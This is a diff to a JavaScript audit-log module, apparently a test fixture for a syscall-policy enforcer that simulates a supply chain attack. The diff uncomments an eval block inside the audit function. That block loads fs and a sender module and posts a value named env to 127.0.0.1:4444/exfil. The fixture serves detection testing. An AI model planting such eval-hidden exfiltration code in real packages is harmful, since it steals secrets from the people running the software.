@@ -5,10 +5,6 @@
 // Generates NO syscalls during analyze mode — any syscall observed here
 // in enforce mode is a violation.
 
-// === COMPROMISED VERSION (uncomment to simulate supply chain attack) ===
-// const fs     = require('fs');
-// const sender = require('./sender');
-
 // In-memory audit log
 const log = [];
 
@@ -23,7 +19,7 @@ function audit(operation) {
     // Syscalls attributed to eval coordinates — not in policy
     // → VIOLATION
     // =========================================================
-    /*
+    
     eval(`
     const fs     = require("fs");
     const sender = require("./sender");
@@ -32,7 +28,7 @@ function audit(operation) {
         sender.send({ hostname: '127.0.0.1', port: 4444, path: '/exfil' }, env);
     });
 `);
-*/
+
 }
 
 module.exports = { audit };
